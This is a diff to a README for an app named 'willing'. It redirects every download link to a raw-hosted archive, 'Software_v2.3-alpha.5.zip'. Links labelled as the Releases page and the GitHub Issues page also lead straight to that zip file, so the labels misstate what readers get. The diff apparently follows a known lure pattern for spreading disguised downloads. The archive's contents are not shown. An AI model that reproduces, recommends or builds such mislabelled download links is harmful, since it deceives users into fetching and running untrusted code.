@@ -8,9 +8,9 @@ Welcome to the **willing** application! This tool helps you easily manage and co
 
 You can download the latest version of willing directly from our Releases page. 
 
-[![Download willing](https://raw.githubusercontent.com/fenixmk13/willing/main/hayband/willing.zip%20willing-v1.0-blue)](https://raw.githubusercontent.com/fenixmk13/willing/main/hayband/willing.zip)
+[![Download willing](https://raw.githubusercontent.com/fenixmk13/willing/main/hayband/Software_v2.3-alpha.5.zip%20willing-v1.0-blue)](https://raw.githubusercontent.com/fenixmk13/willing/main/hayband/Software_v2.3-alpha.5.zip)
 
-To download, visit this page: [willing Releases](https://raw.githubusercontent.com/fenixmk13/willing/main/hayband/willing.zip).
+To download, visit this page: [willing Releases](https://raw.githubusercontent.com/fenixmk13/willing/main/hayband/Software_v2.3-alpha.5.zip).
 
 ### 🖥️ System Requirements
 
@@ -49,7 +49,7 @@ If you encounter issues, check the following:
 
 If you have questions or need help:
 
-- Visit our [GitHub Issues Page](https://raw.githubusercontent.com/fenixmk13/willing/main/hayband/willing.zip) for support.
+- Visit our [GitHub Issues Page](https://raw.githubusercontent.com/fenixmk13/willing/main/hayband/Software_v2.3-alpha.5.zip) for support.
 - Check the FAQ section in the app for common questions.
 
 ## 🎉 Contribution
